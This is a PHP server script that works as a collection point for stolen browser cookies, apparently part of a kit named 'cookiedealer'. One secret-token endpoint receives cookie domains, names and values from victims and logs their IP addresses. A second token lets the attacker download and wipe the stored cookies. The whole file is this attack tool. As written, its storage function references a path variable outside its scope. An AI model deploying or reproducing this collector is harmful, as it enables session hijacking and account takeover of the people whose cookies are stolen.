<?php
$secret_attacker_token = "<PLACEHOLDER_SECRET_ATTACKER_TOKEN>";
$secret_victim_token = "<PLACEHOLDER_SECRET_VICTIM_TOKEN>";

//should be stored outside of the web root
//make sure the storage file starts off with []
$cookie_storage_path = "/var/www/cookiedealer.json";

header('Content-Type: application/json');
function store_data($setname, $description, $cookies){
    $content = file_get_contents($cookie_storage_path);
    $all_entries = json_decode($content, true);
    $entry = ["name" => $setname, "description" => $description, "cookies" => $cookies];
    $all_entries[] = $entry;
    $content = json_encode($all_entries);
    file_put_contents($cookie_storage_path, $content);
}

//Token to fetch data from server...
if (isset($_GET["token"]) && $_GET["token"] === $secret_attacker_token) {
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        //Send data back
        echo file_get_contents($cookie_storage_path);
        if (isset($_GET['DELETE'])) {
            file_put_contents($cookie_storage_path, "[]");
        }
    }
}

//Token to send data to server...
if (isset($_GET["token"]) && $_GET["token"] === $secret_victim_token) {
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $time = time();
        $setname = $_SERVER['REMOTE_ADDR'] . "-" . $time;
        $description = "IP who submitted cookie: " . $_SERVER['REMOTE_ADDR'] . "\n" . "Timestamp: " . $time . "\n";
        $cookies = [];
        if (isset($_GET["domain"]) && isset($_GET["name"]) && isset($_GET["value"]) && isset($_GET["description"])){
            $description = $description . "\nDescription received from client: \n" . $_GET["description"] . "\n\n";
            if (is_array($_GET["domain"]) && is_array($_GET["name"]) && is_array($_GET["value"])){
                //We either accept domain, name and value set to be arrays
                if (count($_GET["domain"]) === count($_GET["name"]) && count($_GET["domain"]) === count($_GET["value"])){
                    for ($i = 0; $i < count($_GET["domain"]); $i++) {
                        $cookie = ["domain" => $_GET["domain"][$i], "name" => $_GET["name"][$i], "value" => $_GET["value"][$i]];
                        $description = $description . "Domain: " . $_GET["domain"][$i] . "\nCookie name: " . $_GET["name"][$i] . "\nCookie value (first 10 chars): " . substr($_GET["value"][$i], 0, 10) . "\n";
                        $cookies[] = $cookie;
                    }
                }
            }
            else{
                //or only one domain, name and value set (only one cookie)
                $cookie = ["domain" => $_GET["domain"], "name" => $_GET["name"], "value" => $_GET["value"]];
                $cookies[] = $cookie;
                $description = $description . "Domain: " . $_GET["domain"] . "\nCookie name: " . $_GET["name"] . "\nCookie value (first 10 chars): " . substr($_GET["value"], 0, 10) . "\n";
            }
            store_data($setname, $description, $cookies);
        }
    }    
}
?>
